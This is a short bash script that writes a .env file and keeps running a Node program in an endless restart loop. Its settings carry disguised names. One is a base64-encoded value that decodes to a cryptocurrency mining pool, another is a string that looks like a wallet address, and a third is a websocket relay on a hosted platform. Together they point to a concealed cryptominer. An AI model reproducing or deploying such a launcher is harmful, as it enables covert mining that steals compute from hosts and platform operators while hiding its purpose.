#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://node--wss--9fb77cgtfy78.code.run
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
